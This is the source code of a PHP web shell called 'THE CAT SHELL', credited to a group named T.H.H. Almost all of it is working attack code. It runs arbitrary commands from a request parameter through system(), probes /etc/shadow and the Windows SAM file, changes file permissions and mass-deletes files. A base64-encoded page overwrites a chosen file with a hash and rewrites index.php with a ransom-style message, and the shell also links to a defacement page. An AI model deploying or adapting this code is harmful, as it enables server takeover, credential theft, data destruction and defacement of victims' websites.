<!-- THE CAT SHELL PRODUCT BY T.H.H TEAM-->

	

<?php
//-----------------------THE CAT SHELL-----------
// Read and modify permetions 
//server version , software version,php version and more
// command shell and show if sensitive files are enable
//Product in 17/01/2018 
//you can modify this tool 
$ips = $_SERVER['HTTP_HOST']; 

?>
<html>
	
	<body background="http://www.linuxbackgrounds.com/backgrounds/treewallpaper.jpg">
    <center><h3><font color="red" size="4px">Server version : </font><font color="green"><?php echo php_uname();?></font></h3></center>
	<center><h3><font color="red" size="4px">Server Host : </font><font color="green"><?php echo $ips; ?></font></h3></center><br>
	<center><h3><font color="red" size="4px">Server Software : </font><font color="green"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></font></h3></center><br>
	<center><h3><font color="red" size="4px">Php version : </font><font color="green"><?php echo phpversion(); ?></h3></font></center><br>	
		<form action="<?php $_SERVER['PHP_SELF'];?>" method="GET">
		FIle :<input type="text" name="file" placeholder="exemple.txt"> <small>complete file name !!</small>
		<br>
		<br>
		Perm : <input type="nombre" name="perm" placeholder="755">
		<button name="con">Read</button>
		<br>
		<br>
		Shell : <input type="text" name="cmd" placeholder="">
		<button name="subq">RUN</button><br><br>
		Pass :<input type="text"  name="md5" />
       <button name="sub" >Crypt</button>
		<br><br>
		<button name="cry" class="baba">File Crypt</button><br><br>
		<button name="dell" class="baba">Delet Files</button>
		<br>
    </form>
    <form action="webdeface.php" method="POST"/>
    <button name="" class="baba">Web Deface</button><br><br>
    </form>

	</body>
</html>
<?php
error_reporting(0);
$file = htmlentities(htmlspecialchars($_GET['file']));
$perm = htmlentities(htmlspecialchars($_GET['perm']));
if (isset($_GET['cry'])){
  $filecrypt = fopen("crypt.php", "w");
  fwrite($filecrypt, base64_decode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KCTx0aXRsZT48L3RpdGxlPgo8L2hlYWQ+Cjxib2R5Pgo8Zm9ybSBhY3Rpb249Ijw/cGhwIGh0bWxzcGVjaWFsY2hhcnMoJF9TRVJWRVJbJ1BIUF9TRUxGJ10pOz8+IiBtZXRob2Q9IlBPU1QiPgoJPGNlbnRlcj4KCTxmb250IGNvbG9yPSJncmVlbiIgc2l6ZT0iNXB4Ij5Zb3VyIEZpbGUgOiA8L2ZvbnQ+PGlucHV0IHR5cGU9InRleHQiIG5hbWU9Imhhc2hpbmciIHJlcXVpcmVkPSIiIHBsYWNlaG9sZGVyPSJZb3VyIEZpbGUgTmFtZSAiPiA8YnV0dG9uIG5hbWU9InN1YnEiPiBDcnlwdDwvYnV0dG9uPjxicj48YnI+PGZvbnQgY29sb3I9InJlZCI+CglNYWtlIFRoZSBuYW1lIG9mIHlvdXIgZmlsZSAodHh0LHBocCxqcGcscGRmLi4uKTxicj4KCWFuZCBpdCB3aWxsIGJlIGVuY3J5cHRlZCBhbmQgaW1vc3NpYmxlIHRvIERlc2NyeXB0PGJyPgoJdGhlIGZpbGUgCglDcnlwdCBNZXRob2RlIHNoYTE9PT5tZDU9PT5iYXNlNjQ8L2ZvbnQ+Cgk8L2NlbnRlcj4KPC9mb3JtPgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJaW5wdXRbdHlwZT0idGV4dCJde3dpZHRoOjI1MHB4O2hlaWdodDoyMHB4O21hcmdpbjo4cHg7fQoJYnV0dG9ue2JvcmRlcjo7Y29sb3I6d2hpdGU7YmFja2dyb3VuZC1jb2xvcjpncmVlbjt3aWR0aDo5JX0KICAgIAoKCjwvc3R5bGU+CjwvYm9keT4KPC9odG1sPgo8P3BocAplcnJvcl9yZXBvcnRpbmcoMCk7CiRmaWxlID0gJF9QT1NUWydoYXNoaW5nJ107CgokZiA9IGZvcGVuKCRmaWxlLCAiciIpOwokZmkgPWZyZWFkKCRmLCAyMDAwMDAwMCk7CmZjbG9zZSgkZik7CgokZCA9IGZvcGVuKCRmaWxlLCAidyIpOwpmd3JpdGUoJGQsICJFTkNSWVBURUQiLnNoYTEobWQ1KGJhc2U2NF9lbmNvZGUoJGZpKSkpKTsKZmNsb3NlKCRkKTsKJGluZGV4ID0gZm9wZW4oImluZGV4LnBocCIsICJ3Iik7CmZ3cml0ZSgkaW5kZXgsICJPUFMgWW91ciBGaWxlcyBIYXMgYmVubiBFbmNyeXB0ICIpOwpmY2xvc2UoJGluZGV4KTsKaWYgKGZpbGVfZXhpc3RzKCRmaWxlKSApewoJZnVuY3Rpb24gY2huYW1lKCRmaWxlMil7CglyZW5hbWUoJGZpbGUyLCAiJGZpbGUyLkNyeXB0Iik7fQpjaG5hbWUoJGZpbGUpOwoKfQppZiAoZmlsZV9leGlzdHMoImluZGV4LnBocC8iKSl7CgllY2hvICI8Y2VudGVyPjxmb250IGNvbG9yPXJlZD4iLiRmaWxlIC4gIj09PT09PT09PT09PiIgLiAiU3VjYzwvZm9udD48L2NlbnRlcj4iOwp9Cgo/PgoK"));
  fclose($filecrypt);
  header("Location:crypt.php");
}
$con = $_GET['con'];
$cmd = $_GET['cmd'];
$del = "*.gif *.pdf *.txt *.jpg *.jpeg *.rar *.zip *.css *.jss *.bitamp *.docx *.PNG";
$a = $_GET['dela'];
$md5 = $_GET['md5'];
if (isset($_GET['sub'])){
echo 'Pass MD5: '.md5($md5).'<br>';
echo 'Pass Base64: '.base64_encode($md5).'<br><br>';
 }function password($file){if (is_readable($file)){
echo "<font color=green siz=2px>$file Enable</font><br>";}else {
echo "<font color=red siz=2px>$file Not enable</font><br>";}}
password("/etc/passwd");
password("/etc/shadow");
password("C:\Windows\System32\drivers\\etc\hosts");
password("C:\Windows\System32\config\SAM") ."<br><br>";
echo "***************************************************<br>";
echo "<font color=blue>SERVER ADMIN :</font>" .$_SERVER['SERVER_ADMIN']."<br>";echo "<font color=blue>Server Port :</font>".$_SERVER['SERVER_PORT']."<br>";echo "<font color=blue>Server Protocol :</font>".$_SERVER['SERVER_PROTOCOL']."<br>";
if (file_exists($file) ){
chmod($file, $perm);

if (isset($con)){
echo "------------------------------------------<br><form method=POST><textarea name=txx rows=40 cols=70 wrap=off>";
echo  htmlspecialchars(file_get_contents($file)) ;
echo "<br>-------------------------------------------";

}
}if (isset($cmd)) {
echo "------------------------------------------<br><textarea rows=30 cols=60>";
system($cmd);
echo "</textarea><br>-------------------------------------------<br>";}
if (isset($_GET['dell'])){
  shell_exec("del $del /Q /S /F");
  shell_exec("rm $del");
}
?><style type="text/css">
button {
  background: #bd34d9;
  background-image: -webkit-linear-gradient(top, #bd34d9, #2980b9);
  background-image: -moz-linear-gradient(top, #bd34d9, #2980b9);
  background-image: -ms-linear-gradient(top, #bd34d9, #2980b9);
  background-image: -o-linear-gradient(top, #bd34d9, #2980b9);
  background-image: linear-gradient(to bottom, #bd34d9, #2980b9);
  -webkit-border-radius: 28;
  -moz-border-radius: 28;
  border-radius: 28px;
  text-shadow: 7px 1px 3px #240e24;
  font-family: Arial;
  color: #ffffff;
  font-size: 15px;
  padding: 10px 20px 10px 20px;
  text-decoration: none;
}

button {
  background: #3cb0fd;
  background-image: -webkit-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -moz-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -ms-linear-gradient(top, #3cb0fd, #3498db);
  background-image: -o-linear-gradient(top, #3cb0fd, #3498db);
  background-image: linear-gradient(to bottom, #3cb0fd, #3498db);
  text-decoration: none;
}
</style>
<br><br><br><h2><font color="#000" size="10px">T.H.H </font></h2>
<?php echo "<font color=green>Your ip is :</font>" .$_SERVER['REMOTE_ADDR']?>
